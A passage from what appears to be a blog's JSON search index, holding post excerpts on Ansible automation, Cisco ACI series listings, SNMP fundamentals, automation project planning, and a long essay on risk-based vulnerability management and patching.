tutorials.\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/01/22/cisco-automation-series/","title":"Cisco automation series"},{"categories":["learning-paths","automation"],"contents":"Explore the comprehensive slides from our Ansible Workbook for DevNetOps course, designed to enhance your understanding of automation and orchestration. These slides cover key concepts, practical applications, and hands-on exercises that will help you master Ansible. Whether you\u0026rsquo;re a beginner or looking to refine your skills, these resources will serve as a valuable reference throughout your automation journey. Download the slides now to start implementing best practices in your own projects!\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/01/15/ansible-workbook-for-devnetops-slides/","title":"Ansible Workbook for DevNetOps slides"},{"categories":["learning-paths","automation"],"contents":"In this course, we used Ansible manually. To take the next step, we need an orchestrator that can help organize playbooks, manage execution, and generate reports.\nThere are several solutions available, and in this post, we will describe the most popular ones.\nAnsible Navigator Ansible Navigator is a command-line tool and a text-based user interface (TUI) for creating, reviewing, running and troubleshooting Ansible content, including inventories, playbooks, collections, documentation and container images (execution environments).\nAnsible Navigator is designed to run from within containers. Personally, I prefer to disable this behavior:\nansible-navigator --ee=false run playbook-output.yml As we\u0026rsquo;ve seen, Ansible Navigator isn\u0026rsquo;t exactly an orchestrator; it\u0026rsquo;s a utility that allows you to run playbooks, analyze configurations, inventories, and collections, as well as perform linting.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/01/13/ansible-orchestrators-and-integration-tools/","title":"Ansible orchestrators and integration tools"},{"categories":["learning-paths","automation"],"contents":"Welcome to our series on Cisco Automation Solutions! In this series, we\u0026rsquo;ll explore how Cisco\u0026rsquo;s powerful tools and technologies, like Catalyst Center, APIs, and SDKs, can help automate network management, optimize configurations, and improve device monitoring. From simplifying complex tasks to ensuring compliance, Cisco\u0026rsquo;s automation capabilities can streamline your IT infrastructure and boost efficiency.\nWe\u0026rsquo;ll start with the fundamentals, then dive into advanced strategies with hands-on examples and best practices. Whether you\u0026rsquo;re new to automation or looking to elevate your skills, this series has something for everyone.\nJoin us as we unlock the power of Cisco automation and transform the way you manage your network!\nCisco ACI automation posts This section is dedicated to Cisco ACI, Cisco\u0026rsquo;s flagship SDN solution for data centers. Here you\u0026rsquo;ll find articles that explain its architecture, demonstrate how to automate tasks using its powerful API-first design, and guide you through real-world use cases to make the most of your ACI deployment.\n01. Introduction to Cisco ACI 02. Setting up a Cisco ACI lab environment 03. Operating with Cisco ACI 04. Cisco ACI object model explained 05. Logging into Cisco ACI 06. From Single-Site to Multi-Site with NDO 07. Circular Dependencies with NDO 08. Frameworks for Projects with Cisco ACI and NDO 09. Simplifying the Data Structure 10. Managing Cisco NDO Limitations from the APIC (released on 26/10/2025) 11. A practical Cisco NDO multi-site use case: modelling (released on 02/11/2025) 12. A practical Cisco NDO multi-site use case: additional configuration (released on 09/11/2025) 13. A practical Cisco NDO multi-site use case: data validation (released on 16/11/2025) 14. A practical Cisco NDO multi-site use case: building the parser (released on 23/11/2025) 15. A practical Cisco NDO multi-site use case: config deploy (released on 30/11/2025) Other posts about Cisco equipments In this section, we focus on automation beyond the data center, covering tools and strategies for campus networks, switches, and routers. You\u0026rsquo;ll find practical automation examples that help ensure consistency, improve uptime, and simplify ongoing operations.\nAutomating configuration compliance verification for Cisco Switches Get Started Today By joining this Patreon series, you\u0026rsquo;ll unlock exclusive content focused on mastering Ansible for network automation. Dive into detailed tutorials and real-world use cases that will help you streamline your network configurations and automate complex tasks with ease. Stay ahead of the curve with practical insights and hands-on experience that will transform your approach to network management.\nIf you found this information useful, consider supporting us on Patreon for more in-depth guides and tutorials.\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2025/01/01/cisco-automation-series/","title":"Cisco automation series"},{"categories":["learning-paths","automation"],"contents":"By default, the output of Ansible shows us the tasks executed, for each device, with a brief summary at the end of what has been done. The color determines the outcome of the task: green if no changes were made, yellow if the configuration was modified, red in case of an error, and blue if the task was skipped.\nThe output can be customized using callbacks by acting on the ansible.cfg configuration file:\nstdout_callback allows setting the main plugin that generates the output, by default it is ansible.builtin.default; callbacks_enabled allows specifying which plugins are enabled, by default the list is empty. The official documentation lists numerous plugins that can also be viewed with:\nansible-doc -t callback -l Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2025/01/01/enhancing-ansible-output/","title":"Enhancing Ansible output"},{"categories":["learning-paths","automation"],"contents":"Password management is one of the topics that should be analyzed during the design phase, i.e., before starting to write code. However, from a learning perspective, I prefer to postpone the topic in order to have some basic knowledge.\nIn general, I feel inclined to discourage any approach that involves having credentials saved in clear text in files or playbooks. Where possible, I recommend using named credentials that are manually entered during playbook execution.\nThe use of orchestrators like Ansible Tower or AWX might make it preferable to choose a particular vault, i.e., an encrypted password database accessible via API. The use of a vault in manually executing playbooks, in my opinion, makes little sense because it simply shifts the problem: the credentials are contained in the vault, but somewhere the token must be saved so that the playbook can access the vault.\nFinally, as seen previously, the use of dynamic inventories might make it preferable to save credentials within the inventory itself, which, being generated dynamically, leaves no trace except in RAM. However, once again, we are shifting the problem: somehow the script that generates the inventory must be able to authenticate itself.\nLet\u0026rsquo;s see two examples, knowing that each environment will require specific considerations regarding the security and confidentiality of credentials. So, let\u0026rsquo;s open the Simple Network Lab and start R1.\nNamed Credentials The simplest and safest way to manage credentials is to pass them directly on the command line during each execution:\n./playbook-auth.yml -u admin -k Before execution, we will be asked for the password of the admin user. If the user needs to perform privilege escalation, it is possible to use the -K parameter, which would prompt us for the enable password.\nAnsible Vault Continue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/12/25/password-management-with-ansible/","title":"Password Management with Ansible"},{"categories":["learning-paths","automation"],"contents":"We have seen that Ansible is an excellent tool for enhancing operations by automating tasks and orchestrating processes. Ansible\u0026rsquo;s procedural structure makes it easy to transform manual tasks into automated ones: if we can describe a task, we can build a playbook to implement it.\nWhen properly structured, a playbook not only becomes the official way of operating but also serves as documentation of the process itself.\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/12/18/key-takeaways-from-the-ansible-course/","title":"Key takeaways from the Ansible course"},{"categories":["learning-paths","automation"],"contents":"In the final exercise, we\u0026rsquo;ll see how to put together what we\u0026rsquo;ve learned to configure and manage a legacy fabric (based on STP).\nSo let\u0026rsquo;s open the Cisco Legacy Core-Access topology lab, start all the devices, and make sure they\u0026rsquo;re reachable.\nModeling Before even thinking about writing playbooks, we need to create a model of our environment, which means creating a data structure that can represent our fabric and serve as a working tool. There are many possibilities:\nNetBox / Nautobot : I\u0026rsquo;ve seen integration between these applications, Ansible, and devices. People would make a change on NetBox / Nautobot regarding a device\u0026rsquo;s interface. The change would trigger an Ansible playbook that would modify the configuration on the physical device. GitLab / GitHub : This approach leans more towards Infrastructure as Code. An operator makes a change on the data structure, typically based on CSV / YAML / JSON, and the CI / CD pipeline runs various tests. If everything works, it adjusts the configuration of the devices in production. CSV / XLS / YAML: This is the simplest case, where a simple file contains the parameters of the structure, and the manual execution of a playbook adjusts the configuration of the devices. Any tests are done manually by the operator. For simplicity, let\u0026rsquo;s choose the third approach. The first two would require significant development beyond the scope of this specific course.\nIn particular, for its readability and flexibility, we choose to use a YAML file. The YAML file should contain all the parameters that define our fabric. In particular, we definitely need to include information about:\nDNS hostname and domain NTP SNMP Operationally, we definitely need to apply the following as well:\nhardening of devices configure interfaces In particular, we can imagine that the interfaces have a template based on their function. We will definitely need templates for:\ninter-switch-link (ISL) interfaces interfaces to endpoints Furthermore, the interfaces to endpoints will have a profile based on the connected device, for example:\nvirtualization server firewall client access with VoIP phone management access office devices access We have made this analysis based on our experience, but in a real case, the analysis must be done on the environment we are willing to automate. We must understand how a particular environment is structured and the way people work. Our goal is to formalize a structure (modeling) and standardize the way of working. Only then can we start developing the working tools, which in our case will be based on Ansible.\nPractically speaking, we can create a first draft of a data structure that will define our environment:\nWe also need to define the VLANs that need to be configured in the fabric:\nFinally, we need to define the profile associated with each interface:\nThe decision on how to formalize the interface-profile association is crucial because it has a huge impact on the way of operating but at the same time must ensure the integrity of the infrastructure. The format chosen in the example above appears cumbersome but ensures that interfaces are not associated with multiple profiles.\nLet\u0026rsquo;s see a second example:\nContinue reading the post on Patreon .\n","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2024/12/11/comprehensive-ansible-lab/","title":"Comprehensive Ansible Lab"},{"categories":["learning-paths","automation"],"contents":"SNMP is a protocol developed to manage network devices. Initially, it was designed to configure devices, monitor them, and receive push alerts. SNMP was first conceived in 1988 and has evolved over time.\nSNMP aimed to be a standard interface to devices, regardless of the vendor. It partially succeeded by formalizing a set of interfaces, but it also failed because each vendor was allowed to extend the data structure by adding interfaces necessary to characterize their specific devices.\nSNMP security was a problem for several years, to the extent that the implementation of device configuration functionalities was significantly limited.\nAlthough SNMP has been a vital protocol for network monitoring, its complexity, initial insecurity, and centralized architecture led to the development of alternative solutions.\nIn this post, we review the SNMP ecosystem and how to implement and use it in versions 2 and 3.\nMIB MIB is the modeling language that defines the data structure used by SNMP. MIB (Management Information Base) defines a tree-structured data format that includes all objects manageable via SNMP. Each object has a unique OID (Object Identifier): through the OID, it is possible to access a specific object.\nThe tree consists of a standard part and a custom part. Each company can define its own objects by attaching them to the enterprises branch. Since each object must be unique, any company that needs to define its own objects should request a free Private Enterprise Number from IANA. To date, more than 6000 companies have customized the use of SNMP. There are two dangerous consequences:\nit is difficult to find a repository that contains all the updated MIBs; some MIBs may be incompatible with others because they are based on different versions. If we want to retrieve the hostname of a system via SNMP, we can use the sysName object defined in the SNMPv2-MIB . sysName has ID 5, starting from system, which has ID 1. system attaches to mib-2 , which has ID 1 and is part of mgmt. Moving up the tree, we find that the OID for sysName is: iso.org.dod.internet.mgmt.mib-2.system.5, translated to 1.3.6.1.2.1.1.5.\nsysName is defined as a string that can be accessed in both read and write modes.\nRead/Write are the only two permissions possible in SNMP. Security in the first two versions of SNMP was quite weak, so the write operation was disabled on almost all devices. The introduction of SNMPv3 corrected security issues, but SNMP remained a monitoring protocol rather than a configuration one.\nOn Linux, we can download MIBs using the download-mibs command, included in the snmp-mibs-downloader package:\napt-get -y install snmp snmp-mibs-downloader download-mibs At this point, we should be able to translate OIDs correctly between textual and numeric formats:\nsnmptranslate -m ALL -TB sysNa snmptranslate -m ALL .1.3.6.1.2.1.1.5 snmptranslate -m ALL -On SNMPv2-MIB::sysName snmptranslate -m ALL -Os .1.3.6.1.2.1.1.5 snmptranslate -m ALL -Of .1.3.6.1.2.1.1.5 The snmptranslate command converts a numeric OID into a textual OID. The options used in the commands above are:\n-m ALL to use all available MIBs -TB to search for an OID using a keyword -On to print a textual OID in numeric form -Os to print only the last element of the OID in textual form -Of to print the full textual OID Query A query allows us to read the value of one or more objects. The device must be configured to allow us to read that specific value. Here are some examples for SNMPv2 and SNMPv3.\nConfiguration for SNMPv2 is quite simple: it requires setting a community and the type of access. In the example below, we use the community public, knowing that in a production environment, a much more complex string should be used:\nsnmp-server community public RO We can further enrich the configuration by setting the location and contact fields:\nsnmp-server location Calisota snmp-server contact Andrea Dainese snmp-server ifindex persist Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/12/04/review-of-snmp-fundamentals/","title":"Review of SNMP Fundamentals"},{"categories":["ciso"],"contents":"A lot has already been said about Vulnerability Management (VM), and I\u0026rsquo;ve personally touched on this topic several times before. Yet, the reality is that managing vulnerabilities remains a significant challenge for most organizations.\nOur offensive activities consistently reveal that, when successful, the attack path often hinges on software or logical vulnerabilities. More often than not, these vulnerabilities were already known to the IT department but, for one reason or another, mitigation wasn\u0026rsquo;t feasible.\nIn other words, the success of the offensive action stems from widely known vulnerabilities.\nAnd this isn\u0026rsquo;t a rare scenario.\nWhat is a vulnerability? In the most common (and technical) sense, a vulnerability is a software flaw that can compromise confidentiality, integrity, and/or availability. However, this definition only covers a specific category. If we broaden the concept, the term \u0026ldquo;vulnerability\u0026rdquo; can also apply to:\nProcesses People Configurations Process vulnerabilities A process vulnerability arises when workflows fail to ensure confidentiality, potentially exposing sensitive information to unauthorized individuals. For example, I once came across a box of employee pay slips left unattended in a real-world scenario. In that case, the employee handling the box was following the correct procedure, but the procedure itself failed to account for such risks.\nPsychological vulnerabilities These occur when attackers exploit human weaknesses through social engineering techniques. Phishing, tailgating, and piggybacking are classic examples that target psychological vulnerabilities to extract sensitive information.\nConfiguration vulnerabilities Also known as logical vulnerabilities, these arise when, for instance, a network share allows unauthorized access. Often, such issues result from oversight, but in some cases, they happen because the individual responsible for the setup lacked the necessary security knowledge.\nPhysical vulnerabilities (e.g., locks, doors, gates) could also be mentioned, but focusing too much on these technical aspects might detract from the broader applicability of this discussion.\nManaging vulnerabilities Many people immediately associate \u0026ldquo;vulnerability management\u0026rdquo; with patching. But managing a vulnerability doesn\u0026rsquo;t mean simply eliminating it via a software patch. Managing a vulnerability means assessing the associated risk and mitigating it. Mitigation strategies can include:\nPatching or reconfiguring the system Shutting down the vulnerable system Training employees Adding additional security controls \u0026hellip; In extreme cases, risk can be transferred through insurance (though insurers typically exclude companies deemed too high-risk after their evaluations).\nEvaluating a vulnerability Not all vulnerabilities are created equal. Each vulnerability has unique characteristics regarding type, impact, exploitability, and mitigatability. This means we can\u0026rsquo;t rely solely on standard reports; we need to complement them with public information—subject to change over time—and data specific to our organization.\nIn other words, we need a risk-based mindset when addressing vulnerabilities.\nOne critical aspect to emphasize: the risk associated with a vulnerability changes over time. Typically (though not always), a vulnerability is discovered, eventually exploited, and then becomes dangerous. Furthermore, 2024 alone has shown us several examples of patches that failed to fully resolve issues. This highlights the necessity of continuously monitoring each vulnerability.\nTo better assess vulnerabilities, we should evaluate the likelihood of them being maliciously exploited. This evaluation can consider:\nWhether the vulnerability is practically exploitable. Whether public exploits exist. Evidence, on a global scale, of exploitation by threat actors. Which assets are affected, particularly regarding the data they contain. The potential for lateral movement, i.e., spreading from a compromised asset to adjacent assets. Existing security measures designed to block threats targeting the vulnerable assets. A simplified approach might distill this into three primary factors:\nLikelihood of exploitation, based on the global threat landscape. Impact on the organization if the vulnerability is exploited. Mitigation effectiveness due to existing security controls. CVSS Score ≠ Risk Before discussing how we can assess a vulnerability, we need to clarify a common misconception: the CVSS value cannot be the foundation of our vulnerability assessment process.\nThe first reason is that a vulnerability may not have an associated CVE. There are various reasons why this might happen:\nThe individual who discovered the vulnerability may not have the time or inclination to obtain a CVE designation; The vulnerability might not pertain to software, making it impossible to associate a CVE. The second reason, as noted on the FIRST website, is that the CVSS value is calculated under the assumption that all prerequisites for exploiting the vulnerability are met:\nif a specific configuration is required for an attack to succeed, the vulnerable system should be assessed assuming it is in that configuration.\nCVSS measures the severity of a vulnerability, not the risk associated with it. With appropriate caution, it can be used to calculate risk, but the gap must be filled for vulnerabilities without an associated CVE.\nPractically assessing a vulnerability My approach emphasizes practical and sustainable actions for companies to achieve swift and effective improvements in corporate security. Even at the cost of oversimplifying the theory, my focus is always on the objective.\nWe\u0026rsquo;ve seen that CVSS cannot be used as a sole metric, both because it requires contextualization and because not all vulnerabilities have an associated CVE.\nMany tools for detecting vulnerabilities simplify the process by assuming a risk factor. While this makes the tool easier to use, the resulting data must be supplemented with contextual information.\nIn practice, the simplest (but, as we\u0026rsquo;ll see, incorrect) approach involves using vulnerability scanning tools that identify latent vulnerabilities, associating a risk factor with each.\nUnfortunately, it is quite common for vulnerability scans in organizations to reveal thousands—or even tens of thousands—of vulnerabilities of varying severity. Equally common is the sense of despair among managers who review such reports, as the task ahead may seem insurmountable.\nThe issue lies in the fact that, in any organization, certain activities take precedence over everything else. In other words, vulnerabilities will continue to accumulate because:\nSome systems cannot be shut down; Some systems are untouchable; Some systems are critical but no longer supported; Nobody wants to risk deploying a flawed patch and compromising a critical business service. I have previously discussed the assume breach design concept, which I\u0026rsquo;ll revisit here: every system should be designed with the understanding that it could eventually be compromised. Specifically, if an organization has untouchable systems, these must be placed in a high-security area. This is always the case in the ICS/OT domain, which I\u0026rsquo;ve addressed in a dedicated post.\nIn this context, vulnerability management should begin at the design phase, incorporating security measures to reduce the risk of compromise. However, post-design efforts can be made—albeit labor-intensive—to rethink the architecture.\nMy approach, appropriately simplified (and incomplete), for evaluating a vulnerability involves:\nusing the risk factor suggested by the vulnerability scanning tool; potentially adjusting this factor if the context requires it; applying a corrective value that reflects the impact on the organization; applying a corrective value that reflects the security measures implemented within the organization. In practice:\nthe risk factor is rarely customized; the risk factor considers the vulnerability net of any existing security measures, meaning it represents a publicly exposed asset; the impact on the organization is a pre-calculated factor for each security zone (in this sense, I assume that a compromise can freely propagate within the same zone); the corrective value is pre-calculated for the security measures present in the organization (firewalls, IPS, EDR, SIEM, etc.). Obviously, the approach is imprecise, incomplete, and partly incorrect (we will see why later). However, the contribution it brings to organizations is significant:\nthousands of vulnerabilities are now weighted based on the security measures in place, making it possible to define priorities; security measures are considered, allowing for discussions about whether untouchable assets should be moved to separate zones; the impact of a complete attack is considered, not just that of the vulnerable asset; it allows for defining justifications for why certain assets might remain unpatched. This approach, sometimes referred to as risk-based vulnerability assessment, is gaining increasing traction. Specifically, I am observing that the compliance and insurance sectors are welcoming a risk-based approach and evaluating it positively.\nIn other words, it is justified for critical vulnerabilities to exist, provided they are managed with a risk-based approach.\nPredicting the future In a pragmatic approach, a vulnerability is considered as such if it can be exploited. Many vulnerabilities require such specific conditions that, in practice, exploitation becomes unfeasible. The CVSS value takes into account the complexity of the attack, but it does so with only two possibilities: low and high.\nFIRST has defined a parameter that represents the probability that a vulnerability will be exploited in the next 30 days:\nEPSS is a measure of exploitability. Specifically, EPSS is estimating the probability of observing any exploitation attempts against a vulnerability in the next 30 days.\nThe value of EPSS (Exploit Prediction Scoring System), variable over time, helps us define the SLA to mitigate each vulnerability associated with a CVE.\nMitigating a vulnerability At this point, we should have a list of vulnerabilities with associated risk, net of security measures (Inherent Risk), and a mitigation factor that represents the security measures in place (EDR, firewall, awareness, etc.). The combination of these two factors allows us to determine the risk that a vulnerability will be exploited, considering the security measures (Residual Risk).\nBefore sorting this list in descending order of risk and starting to compile the remediation plan, we are missing one last factor: risk appetite (Risk Appetite). This factor indicates the level of risk that our organization considers acceptable. Once defined, all vulnerabilities with a Residual Risk below this factor are automatically ignored. If we have any doubts, it means our risk model has some flaws.\nWe have now obtained a list of real, exploitable vulnerabilities for which the risk is not considered acceptable. We must therefore define actions to reduce the risk of each vulnerability.\nRisk can be:\nresolved, for example by updating the vulnerable software or shutting it down; mitigated, by implementing a new security measure (e.g., moving the vulnerable system to a higher security zone); transferred, for example through insurance or third parties. Patching Often, a vulnerability can be resolved by installing an update. However, we must ask ourselves when this action should be taken. I have seen organizations with monthly patching policies, at best. In the worst cases, systems are updated once a year or even less frequently.\nFirst, each system and application should have a well-defined maintenance window.\nSecond, we must associate a specific SLA with risk categories: the higher the risk, the faster the updates must be installed, and consequently, the maintenance windows must be scheduled at shorter intervals. Paradoxically, the more critical a system is from a business perspective, the more frequently it must be taken offline for maintenance.\nFor this reason, organizations tend to perform what I call \u0026ldquo;blind patching,\u0026rdquo; which focuses not on risk but on systems that are easiest to update. This is the exact reason that causes the accumulation of hundreds or thousands of vulnerabilities in many companies.\nAn additional consideration on patching activities is often their lack of proper \u0026ldquo;dignity.\u0026rdquo; People responsible for patching do so at their own risk:\nif everything goes well, they receive no recognition; if something goes wrong, they are blamed for the disruption and are responsible for restoring the service. In this environment, people will avoid taking on patching tasks, causing further delays. If we think that the lack of patching is a resource problem, we will soon discover that the real issue is that no one wants to press the button and take on the associated responsibility.\nFrom an organizational perspective, it is unrealistic to have a cross-functional team responsible for software updates. Each system serves an application necessary for the business. In this sense, applications and systems have an assigned owner who guarantees the service. If we want the process to work, we cannot decouple the application responsibility from the update responsibility.\nThe final consideration concerns the maximum time to mitigate a vulnerability. This time depends on conditions that change over time (as we have already discussed with EPSS). It is worth citing a Cloudflare report:\nCVEs exploited as fast as 22 minutes after proof-of-concept published\n22 minutes is an impossible time frame to manage these vulnerabilities manually. In 22 minutes, we might not even notice the new vulnerability. We need to think about a different approach.\nMitigating Risk We have already stated that patching is one of the possibilities for managing software vulnerabilities. However, there are many cases where patching cannot be performed. The typical reasons are:\nThe application cannot be stopped frequently enough to allow continuous patching; The application is no longer supported, and updates are no longer available; The application is no longer sold and/or the vendor no longer exists. There are also more operational reasons, such as:\nNo one wants to take responsibility for updating a mission-critical application; There is no proper rollback system; The risk of encountering issues is higher than the risk of leaving the application as is. This situation is common in ICS/OT environments, especially in production, medical, naval, utilities, oil \u0026amp; gas sectors\u0026hellip; But, on closer inspection, every company has applications that cannot be updated.\nWe must also consider that, very often, business processes are tied to a specific application. The evolution of this application is often faster than the speed at which business processes can evolve. A prime example: the company relies on a specific CRM with customizations that are key to business processes. Subsequent major releases of that CRM do not guarantee full portability of customizations, forcing the company to spend time and resources chasing each successive release.\nIt thus becomes clear that if we use patching as the only method to resolve software vulnerabilities, we will always have a set of unmanageable objects.\nIf we return to a risk-based approach, things change.\nIf we know the risk associated with each application (and thus each asset), we can isolate it in a specific security zone protected by adequate security measures. For example, if we have industrial systems that are particularly vulnerable and important at the same time, we can isolate them in a secure zone. Communications to and from this zone can be limited and controlled to reduce the risk of compromise.\nWe have just described the Purdue model (SANS Secure Architecture for Industrial Control Systems), which suggests creating a containment zone between the IT and OT worlds.\nIt is not certain that the Purdue Model can be implemented in your company, and it likely cannot, but we can use that idea to separate critical, non-upgradable applications from those that are manageable. By optimizing security measures, we can create a sufficiently strong barrier to protect even the most fragile devices.\nSecurity measures can include:\nFirewalls with particularly stringent rules; Web Application Firewall (WAF); EDR / XDR; Behavioral analysis; Active monitoring services; NAC (Network Access Control); Microsegmentation; Network probes; Honeypots; \u0026hellip; In practice, my advice is to start with a well-structured asset inventory. Each asset should be characterized based on its impact on business operations (see NIS2) and personal data (GDPR). Each asset should also have a defined maintenance window: this value is key to understanding how much we can operate on an asset without impacting the business.\nWhere the maintenance window is insufficient to ensure proper maintenance, we need to mitigate the potential risk of compromise by enhancing security measures.\nWe can then define the necessary security zones protected by additional security measures. Ideally, these security measures can be represented by a numerical factor, which can be used to calculate residual risk. This way, for each security zone, there will be a mitigation factor associated with the assets contained within that zone.\nThis approach allows us to extend traditional vulnerability scanning tools by including the context, i.e., the protection derived from the security zone in which the assets reside.\nVA Scanner The most common system today for identifying software vulnerabilities within an organization is Vulnerability Assessment (VA). Specifically, we are talking about Vulnerability Scanner applications that scan the network for known vulnerabilities. Vulnerabilities are detected through signatures: if a service announces its version and it is vulnerable, the scanner will report that service as vulnerable.\nIt is clear that these tools are often overrated.\nGeneric Risk Vulnerability scanners provide a report of detected vulnerabilities, associating a risk with each vulnerability. However, this risk factor is obviously incomplete: it lacks context.\nHowever, we have already seen how to assess risk by associating specific information about the asset and the available security measures.\nLimited Coverage The effectiveness of a scanner, or its ability to find all vulnerabilities present in the infrastructure, is tied to the signature database that the scanner uses. No scanner can have 100% coverage for two reasons:\nThe software landscape is highly diverse, and there are products (like WordPress) that can be extended by a vast ecosystem of plugins; Almost every organization has custom applications. While the utility of a Vulnerability Scanner is undeniable because it allows for the analysis of thousands of devices in a very short time, it is also true that there must be plans for deeper analysis of well-known applications that may not be covered by the scanner.\nIt is also worth mentioning that many companies turn to different vendors to perform VA, hoping to gain better coverage over time. It is obvious that if all companies use the same scanner, the result will be the same. At most, the interpretation may vary.\nLocal Vulnerabilities In almost all cases, Vulnerability Assessments are limited to network scanning. This means that all local vulnerabilities—such as those that could be exploited to escalate privileges after gaining local access—are completely overlooked.\nAnnual Scanning If Vulnerability Assessments are conducted to detect vulnerabilities, we must consider the maximum time that may pass from when a vulnerability becomes public (and starts being exploited) to when we become aware of it.\nWe have seen that active exploitation of a vulnerability can occur within minutes of its discovery. Therefore, conducting annual, semi-annual, quarterly, or even monthly scans makes little sense.\nDetection vs. Verification Vulnerability scanning systems are not meant to discover vulnerabilities; rather, they are intended to check the vulnerability management process.\nIn other words, if the vulnerability management process is functioning correctly, the scanner\u0026rsquo;s report will almost always (if not always) be redundant.\nVulnerability Management The vulnerability management process brings together all the considerations we\u0026rsquo;ve made so far and formalizes the operational procedures. The process begins when a new vulnerability is detected, and this can happen through various sources:\nReports; Automated tools; Individuals. Each report will be analyzed and evaluated to understand the associated risk. If the inherent risk, reassessed based on the existing security measures, exceeds the activation threshold, the change management process will need to be triggered to further mitigate the vulnerability.\nTo summarize:\nPatch Management: Involves updating software to supported versions. Updates to resolve functional bugs are part of this process. Application Lifecycle Management: Involves the removal or migration of obsolete applications that have reached the end of their lifecycle. Vulnerability Management: Involves reducing the risk associated with known vulnerabilities. Automation We have seen that the time interval between the discovery of a technical vulnerability and its exploitation \u0026ldquo;in the wild\u0026rdquo; is very small. On the other hand, technical vulnerabilities are constant, and managing updates to address them requires significant effort. We have also seen that the most critical systems are the hardest to update, both due to the difficulty of halting them and the reluctance to modify critical systems that are functioning.\nWe cannot today think of addressing the vulnerability management process without using automatic or semi-automatic systems. The most basic form of automation, usually applied to end-user devices, involves a weekly update. More complex workflows involve, upon confirmation, updating systems first on test groups, then on groups with increasing criticality.\nMy experience tells me that the more a process is defined and automated within the organization, the less likely people are to question it. In other words, if a system stops functioning due to someone manually updating the system, the responsibility will fall on that person. But if a system is updated through an automated organizational process, any malfunctions are accepted and managed.\nImmutable OS and Containers \u0026ldquo;Immutable\u0026rdquo; systems do not allow for modifications. In other words, an immutable system is created, configured, typically through an automated process, and then destroyed without anyone modifying it. Containers behave the same way in this regard.\nLikewise, immutable systems and containers are not updated but are instead destroyed and recreated from an updated base template.\nThis approach, used by organizations with a strong DevOps culture, is ideal for:\nManaging system changes, including updates; Creating test groups with increasing criticality; Applying updates on a daily/hourly basis; Performing rollbacks to the previous version in a matter of seconds. SBOM and Vulnerabilities in Templates Those who develop, and even those who use open-source software, should monitor the vulnerabilities of the libraries that their main application depends on. This may seem, and indeed is, a monumental task. However, it can be tackled by structuring an automated process to perform these checks.\nThe goal is to prevent situations like the one seen with Log4Shell.\nOne potential approach involves using the CycloneDX utility to get a list of the libraries used by a specific software in a standard format (SBOM or Software Bill of Materials). This list can then be used by a second utility to analyze any vulnerabilities:\ncyclonedx-npm package.json.bak_00.md \u0026gt; sbom.json bomber scan sbom.json The mechanism is certainly improvable, but it is a first step in structuring a process to monitor, as much as possible, the applications installed within the organization.\nPost patching (Threat Hunting) We reach the end of this long post by considering the vulnerability lifecycle:\nOnce a vulnerability is resolved, we must ask ourselves a key question: is it possible that this vulnerability has already been exploited? How should we proceed?\nThe answer is not simple and depends heavily on the vulnerability. In some cases, there are Indicators of Compromise (IoC) associated with the vulnerability that help us determine whether the vulnerability has already been exploited, but in many cases, these indicators are not available.\nIdeally, organizations regularly perform an activity (Threat Hunting) aimed at detecting silent threats already within the organization that, for some reason, were not detected or blocked by other security systems.\nOur vulnerability management process could therefore trigger specific Threat Hunting activities for the vulnerability we are managing. For example, we might want to initiate in-depth analyses for particularly critical vulnerabilities, with an EPSS score above 70%.\n","cover":"/blog/2024/12/02/vulnerability-management/cover.webp","permalink":"https://www.adainese.it/blog/2024/12/02/vulnerability-management/","title":"Vulnerability Management"},{"categories":["learning-paths","automation"],"contents":"Before launching any automation project, even before opening our editor, we need to define the essential steps for project success. Equally important is understanding the most common reasons automation projects can fail.\nThere\u0026rsquo;s often a large gap between expectations and reality in the field. This gap has driven me to create a practical approach drawn from my field experience.\nIn an ideal world, the devices we work with are modern, standardized, and compatible across the board, making tools, frameworks, and orchestrators the perfect fit for rapid operational improvements. However, in reality, we often encounter a mix of newer devices and those that reached end-of-support years ago, each with unique configurations that demand a highly precise and nuanced approach.\nFormal training can\u0026rsquo;t fully prepare you for these scenarios, as their specific nature defies standardization in traditional courses. But ignoring these issues is no longer an option: the shortage of qualified personnel means that traditional infrastructure management has become unsustainable. Specific training projects can greatly improve operations in a short time. Here, automation is key in gradually bringing infrastructure back under control.\nKey factors for project success Certain factors contribute significantly to the success of automation projects:\nUnderstand the scenario: Process automation vs Task Automation Engage decision-makers: Operational improvements require involvement from key stakeholders. Without their engagement and support, it\u0026rsquo;s nearly impossible to achieve lasting improvements. Standardize processes and define use cases: Automation requires a clear process. We must be able to define and standardize each step we plan to automate. Modeling: Part of the design phase, this step is crucial and often underappreciated. It\u0026rsquo;s essential to map out and visualize each process, as this groundwork shapes the entire project. Configuration approach: Choosing between a golden configuration or a differential approach impacts the project deeply, and it\u0026rsquo;s often a long-term commitment. Inventory: the inventory isn\u0026rsquo;t just a device list, it\u0026rsquo;s a structured set of input data for specific configurations. Maintain an up-to-date lab: Each automation project should include a test environment for continual development and validation. Prepare for large-scale outages: Automation at scale means errors, if not managed, can have significant repercussions. Accounting for potential issues is crucial. Document thoroughly: Proper documentation ensures that automated processes remain maintainable. Write reusable code: Writing reusable code helps to broaden the project scope over time. Standardize the development environment: Standardized, certified environments ensure a reliable automation platform. These factors are listed by importance and align with their typical order of occurrence in a project.\nSingle task automation I call single task automation an activity that arises from a purely personal need, aimed at automating a series of activities (tasks) of the individual themselves. In most cases, automation in a company starts like this: there are repetitive tasks, and if the person performing them is particularly creative, they will write a small software to automate those tasks. Let\u0026rsquo;s look at its characteristics:\nOne-shot; Based on procedural scripts, written to solve a task, and generally not reusable; Aimed at personal use; Does not involve the team but remains confined to the individual; Not included in any procedure; Closely linked to the person who developed it. Continue reading the post on Patreon .\n","cover":"/images/categories/learning-paths.webp","permalink":"https://www.adainese.it/blog/2024/11/27/key-steps-for-real-world-success/","title":"Key steps for Real-World success"},{"categories":["learning-paths","automation"],"contents":"In many environments, there exists a 